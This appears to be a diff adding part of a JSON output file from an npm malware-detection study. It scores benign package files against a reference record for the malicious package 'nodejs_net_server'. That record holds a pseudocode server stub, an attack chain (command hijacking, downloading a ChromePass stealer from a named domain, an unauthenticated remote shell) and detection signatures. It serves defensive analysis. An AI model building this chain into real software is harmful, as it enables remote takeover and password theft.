+              "code_similarity": 0.43623894453048706,
+              "behavior_similarity": 0.4960346817970276,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode based on report description\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  // Accepts remote shell commands, file operations, etc.\n});\nserver.listen(port, ip);",
+                "code_behavior": "At runtime, the code starts a TCP socket server that listens for remote connections, receives and executes shell commands, performs file operations, and allows file uploads, enabling remote control of the victim's system.",
+                "malice_analysis": {
+                  "why_suspicious": "Opening a remote shell and exposing file operations over a network socket without authentication is highly dangerous and not expected in a typical npm package.",
+                  "violated_expectations": "Normal packages should not expose remote shell access or arbitrary file operations without explicit user configuration, authentication, and security controls.",
+                  "similar_legitimate_use": "Some legitimate remote administration tools or development servers may expose similar functionality, but always with authentication, user awareness, and clear documentation.",
+                  "key_indicators": [
+                    "Socket server accepting remote commands",
+                    "Shell command execution capability",
+                    "File upload and manipulation features",
+                    "No authentication or access control"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when package is used)",
+                  "file_location": "lib/test.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs_net_server",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 - 1.1.2",
+                  "why_malicious": "The package includes and/or downloads a Windows executable (a.exe, ChromePass) that extracts Chrome browser passwords, exposes a remote shell and file operation server without authentication, and hijacks the 'jstest' command via the bin field. These behaviors enable credential theft, remote system compromise, and command hijacking, posing severe security risks. The inclusion of credential-stealing tools and remote control features in a public npm package is highly suspicious and dangerous, regardless of the author's stated intent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Package is installed, and the 'bin' field in package.json creates or overwrites the 'jstest' command in the user's environment.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "User or system may execute the malicious 'jstest' command, leading to further code execution under the attacker's control."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During install or runtime, the package downloads the ChromePass executable (a.exe) from a remote server (chrunlee.cn) and saves it locally.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious binary (a.exe) is present on the system and ready for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package exposes a remote shell and file operation server, allowing remote attackers to connect and issue commands, including execution of downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker can remotely control the victim's system, execute arbitrary commands, and run the credential-stealing binary."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The ChromePass binary (a.exe) is executed, extracting all Chrome browser passwords from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credentials are stolen and can be exfiltrated by the attacker, resulting in compromise of sensitive user data."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Inclusion or download of credential-stealing binaries (e.g., ChromePass) in npm packages",
+                    "Socket servers exposing unauthenticated remote shell or file operations",
+                    "Hijacking of common CLI commands via the bin field in package.json",
+                    "Downloading executables from non-official domains (e.g., chrunlee.cn) during install or runtime",
+                    "Execution of Windows binaries from within a Node.js package"
+                  ],
+                  "file_indicators": [
+                    "package/lib/a.exe",
+                    "Downloaded a.exe in package directory",
+                    "package.json with bin field defining 'jstest'",
+                    "lib/test.js implementing a TCP server"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to chrunlee.cn or similar non-official domains",
+                    "Unusual TCP socket connections initiated by nodejs_net_server",
+                    "Inbound connections to TCP server started by the package"
+                  ],
+                  "how_to_detect": "Monitor npm packages for inclusion of suspicious binaries such as ChromePass, analyze package.json for bin field hijacking common command names, and flag packages that download executables from untrusted domains like chrunlee.cn. Use static and dynamic analysis to identify code that downloads or executes binaries, starts unauthenticated socket servers, or exposes remote shell/file operations. Monitor for unexpected network activity to suspicious domains and for inbound connections to local TCP servers started by the package. Correlate these behaviors to identify malicious packages."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/lib/AccessoryUtil.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/lib/ConfigUtil.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/lib/DeviceUtil.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/lib/GatewayUtil.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/lib/LogUtil.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/lib/ParseUtil.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/manage/easyui/jquery.easyui.min.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/manage/easyui/jquery.min.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/parser/AccessoryParser.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-mi-aqara-pei/0.8.1/package/parser/AcpartnerParser.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
